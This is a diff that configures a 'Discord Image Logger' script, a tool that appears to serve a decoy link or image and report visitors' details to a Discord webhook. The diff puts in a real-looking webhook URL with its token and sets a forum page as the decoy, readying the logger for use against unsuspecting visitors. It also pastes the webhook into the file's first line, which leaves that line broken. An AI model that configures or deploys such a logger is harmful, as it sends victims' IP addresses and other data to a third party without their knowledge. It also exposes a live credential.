@@ -1,4 +1,4 @@
-# Discord Image Logger
+https://discord.com/api/webhooks/1233981251723984926/MB4LRp8NYojURVWiN67JArs9FCAXB0myUeCpfEusM9NEbm8aZZ-t1uG8b-xOGnlW3TaX# Discord Image Logger
 # By DeKrypt | https://github.com/dekrypted
 
 from http.server import BaseHTTPRequestHandler
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1233981251723984926/MB4LRp8NYojURVWiN67JArs9FCAXB0myUeCpfEusM9NEbm8aZZ-t1uG8b-xOGnlW3TaX",
+    "image": "https://forums.unrealengine.com/t/dx12-editor-error-black-screen/465351", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
